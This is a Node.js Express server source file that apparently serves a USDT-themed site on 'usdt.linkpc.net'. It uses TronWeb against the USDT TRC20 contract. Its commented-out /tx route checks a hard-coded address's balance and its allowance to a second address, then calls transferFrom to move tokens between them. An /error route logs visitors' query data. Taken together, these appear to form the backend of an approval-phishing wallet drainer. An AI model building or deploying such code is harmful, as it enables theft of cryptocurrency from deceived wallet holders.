const TronWeb = require('tronweb')
const HttpProvider = TronWeb.providers.HttpProvider;
const fullNode = new HttpProvider("https://api.trongrid.io");
const solidityNode = new HttpProvider("https://api.trongrid.io");
//const eventServer = new HttpProvider("https://api.trongrid.io");
const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";//contract address
const tronWeb = new TronWeb(fullNode,solidityNode);

tronWeb.setAddress(trc20ContractAddress);


var express = require('express');

var fs = require("fs");

var https = require('https');

var server = express();

server.get('/error', function(req, res){
	console.log(req.query)
})

//server.get('/front', function(req, res){
//	console.log(req.query.a);
//})


//server.get('/tx', async function (req, res) {
//	console.log(req.query.fromaddr, req.query.toaddr);
//	try {
//		let contract = await tronWeb.contract().at(trc20ContractAddress);
//		let fromBalance = await contract.balanceOf("TTZFd8teMLhSTRxY6w4ZPv92h4tB35HHfi").call();
//		let allowance = await contract.allowance(
//		    "TTZFd8teMLhSTRxY6w4ZPv92h4tB35HHfi", //address _owner
//		    "TPjDZeMernRKLHeprbDRJeroMFm9Hkm1Cp" //address _spender
//		).call();
//		//console.log(tronWeb.fromSun(fromBalance));
//		//console.log(tronWeb.fromSun(allowance));
//
//		await contract.transferFrom(
//	            "TTZFd8teMLhSTRxY6w4ZPv92h4tB35HHfi", //address _from
//	            "TPjDZeMernRKLHeprbDRJeroMFm9Hkm1Cp", //address _to
//	            1 //amount
//	        ).send({
//		    feeLimit: 10000000
//		}).then(output => {console.log('- Output:', output, '\n');});
//	} catch(error) {
//		console.error("trigger smart contract error",error)
//	}
//
//	res.send('tx');
//
//})

var port = 443;

var options = {
	    cert: fs.readFileSync('/etc/letsencrypt/live/usdt.linkpc.net/fullchain.pem'),
	    key: fs.readFileSync('/etc/letsencrypt/live/usdt.linkpc.net/privkey.pem'),
};

server.use(express.static(__dirname + '/public'));


https.createServer(options, server).listen(port, function() {
	    console.log('server listening on port ' + port);
});

